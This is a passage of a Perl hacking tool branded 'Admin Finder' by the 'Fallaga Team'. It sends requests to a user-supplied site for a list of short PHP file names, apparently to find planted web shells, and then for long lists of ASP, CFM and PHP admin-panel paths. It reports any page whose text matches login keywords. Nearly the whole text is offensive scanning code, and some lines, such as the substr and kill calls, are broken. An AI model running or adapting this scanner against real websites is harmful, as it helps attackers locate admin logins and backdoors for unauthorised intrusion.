'q.php',
's.php',
'd.php',
'f.php',
'g.php',
'h.php',
'j.php',
'k.php',
'l.php',
'm.php',
'w.php',
'x.php',
'c.php',
'v.php',
'b.php',
'n.php',
'1.php',
'2.php',
'3.php',
'4.php',
'5.php',
'6.php',
'7.php',
'8.php',
'9.php',
'10.php',
'12.php',
'11.php',
'1234.php',);


foreach $com(@path){

$url = $site.$com;
$req = HTTP::Request->new(GET=>$url);
$useragent = LWP::UserAgent->new();

$response = $useragent->request($req);

if ($response->is_success){
print "$com\n";
 $url = substr($url, $com + 13);
 $com = substr($url, 0, index($url, '"'));
 open (txt,">>done.txt");
 print txt  $com,"\n";
 close(txt);
print "=> Dir Found : $url\n";
}
else {
print "=> Not Found : $com\n";
}
}}
}
if($targett eq '2')
{
system('cls');
system('title Admin Finder');
                    {
                        print " Admin Finder \n";
use HTTP::Request;
use LWP::UserAgent;

system('cls');
system('title Admin Finder Rec0ded by Fallag crx');

print"\n";
print "--------------------------------------------------------\n" ;
print "[*]----------Admin Finder Rec0ded by Fallag crx--------[*]\n" ;
print "[*]-------------    ReCoded By Fallag crx    ----------[*]\n" ;
print "[*]------            Fallaga  Team            ---------[*]\n" ;
print "********************************************************\n" ;
print "\n";

print "~# Enter The Site\n* ex: www.domaine.com ou www.domaine.com/path\n-> ";
$site=<STDIN>;
chomp $site;

print "\n";
print "~ Enter Type The Site \n* ex: asp, php, cfm\n-> ";
$code=<STDIN>;
chomp($code);

if ( $site !~ /^http:/ ) {
$site = 'http://' . $site;
}
if ( $site !~ /\/$/ ) {
$site = $site . '/';
}
print "\n";

print "->Your Target: $site\n";
print "->Type Website: $code\n";
print "->Loading\n\n\n";

if($code eq "asp"){

@path1=('cpanel','admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp',
'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
'administrator/account.asp','administrator.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','pages/admin/admin-login.html','admin/admin-login.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','adminLogin.asp',
'admin/adminLogin.asp','home.asp','admin.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','admin-login.html',
'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','administrator/index.asp',
'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html'
);

foreach $ways(@path1){

$final=$site.$ways;

my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);

if($response->content =~ /Username/ ||
$response->content =~ /Password/ ||
$response->content =~ /username/ ||
$response->content =~ /password/ ||
$response->content =~ /USERNAME/ ||
$response->content =~ /PASSWORD/ ||
$response->content =~ /Senha/ ||
$response->content =~ /senha/ ||
$response->content =~ /Personal/ ||
$response->content =~ /Usuario/ ||
$response->content =~ /Clave/ ||
$response->content =~ /Usager/ ||
$response->content =~ /usager/ ||
$response->content =~ /Sing/ ||
$response->content =~ /passe/ ||
$response->content =~ /P\/W/ ||
$response->content =~ /Admin Password/
){
print " \n [+] Found -> $final\n\n";
}else{
print "[-] Not Found <- $final\n";
}
}
}




# -------------------------------------------------------
# -------------------test cfm ---------------------------|
# -------------------------------------------------------





if($code eq "cfm"){

@path1=('cpanel','admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','account.cfm','admin/account.cfm','admin/index.cfm','admin/login.cfm','admin/admin.cfm',
'admin_area/admin.cfm','admin_area/login.cfm','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.cfm','bb-admin/index.cfm','bb-admin/login.cfm','bb-admin/admin.cfm',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
'admin/home.cfm','admin/controlpanel.cfm','admin.cfm','pages/admin/admin-login.cfm','admin/admin-login.cfm','admin-login.cfm','admin/cp.cfm','cp.cfm',
'administrator/account.cfm','administrator.cfm','login.cfm','modelsearch/login.cfm','moderator.cfm','moderator/login.cfm','administrator/login.cfm',
'moderator/admin.cfm','controlpanel.cfm','admin/account.html','adminpanel.html','webadmin.html','pages/admin/admin-login.html','admin/admin-login.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.cfm','user.html','admincp/index.cfm','admincp/login.cfm','admincp/index.html',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
'admincontrol/login.html','adm/index.html','adm.html','admincontrol.cfm','admin/account.cfm','adminpanel.cfm','webadmin.cfm','webadmin/index.cfm',
'webadmin/admin.cfm','webadmin/login.cfm','admin/admin_login.cfm','admin_login.cfm','panel-administracion/login.cfm','adminLogin.cfm',
'admin/adminLogin.cfm','home.cfm','admin.cfm','adminarea/index.cfm','adminarea/admin.cfm','adminarea/login.cfm','admin-login.html',
'panel-administracion/index.cfm','panel-administracion/admin.cfm','modelsearch/index.cfm','modelsearch/admin.cfm','administrator/index.cfm',
'admincontrol/login.cfm','adm/admloginuser.cfm','admloginuser.cfm','admin2.cfm','admin2/login.cfm','admin2/index.cfm','adm/index.cfm',
'adm.cfm','affiliate.cfm','adm_auth.cfm','memberadmin.cfm','administratorlogin.cfm','siteadmin/login.cfm','siteadmin/index.cfm','siteadmin/login.html'
);

foreach $ways(@path1){

$final=$site.$ways;

my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);

if($response->content =~ /Username/ ||
$response->content =~ /Password/ ||
$response->content =~ /username/ ||
$response->content =~ /password/ ||
$response->content =~ /USERNAME/ ||
$response->content =~ /PASSWORD/ ||
$response->content =~ /Senha/ ||
$response->content =~ /senha/ ||
$response->content =~ /Personal/ ||
$response->content =~ /Usuario/ ||
$response->content =~ /Clave/ ||
$response->content =~ /Usager/ ||
$response->content =~ /usager/ ||
$response->content =~ /Sing/ ||
$response->content =~ /passe/ ||
$response->content =~ /P\/W/ ||
$response->content =~ /Admin Password/
){
print " \n [+] Found -> $final\n\n";
}else{
print "[-] Not Found <- $final\n";
}
}
}





# -------------------------------------------------------
#--------------------------/test-------------------------|
# -------------------------------------------------------


if($code eq "php"){

@path2=('cpanel','admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php',
'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html',
'admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
'admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php',
'administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php','adminarea/index.php',
'adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php',
'modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php',
'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php'
);

foreach $ways(@path2){

$final=$site.$ways;

my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);

if($response->content =~ /Username/ ||
$response->content =~ /Password/ ||
$response->content =~ /username/ ||
$response->content =~ /password/ ||
$response->content =~ /USERNAME/ ||
$response->content =~ /PASSWORD/ ||
$response->content =~ /Senha/ ||
$response->content =~ /senha/ ||
$response->content =~ /Personal/ ||
$response->content =~ /Usuario/ ||
$response->content =~ /Clave/ ||
$response->content =~ /Usager/ ||
$response->content =~ /usager/ ||
$response->content =~ /Sing/ ||
$response->content =~ /passe/ ||
$response->content =~ /P\/W/ ||
$response->content =~ /Admin Password/
){
print " \n [+] Found -> $final\n\n";
}else{
print "[-] Not Found <- $final\n";
}
}
kill("STOP",NULL);
}}
}
